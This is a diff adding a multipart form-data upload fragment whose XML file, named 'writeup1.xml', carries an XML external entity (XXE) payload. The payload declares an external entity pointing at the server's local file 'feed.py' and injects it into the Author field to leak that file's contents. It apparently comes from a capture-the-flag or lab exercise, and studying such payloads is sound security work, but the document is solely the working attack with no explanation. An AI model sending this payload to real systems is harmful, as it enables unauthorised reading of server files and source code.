@@ -1,0 +1,11 @@
+Content-Disposition: form-data; name="file"; filename="writeup1.xml"
+Content-Type: text/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:feed.py" >]>
+<Test>
+    <Author>&xxe;</Author>
+    <Subject>writeup</Subject>
+    <Content>writeup</Content>
+</Test>
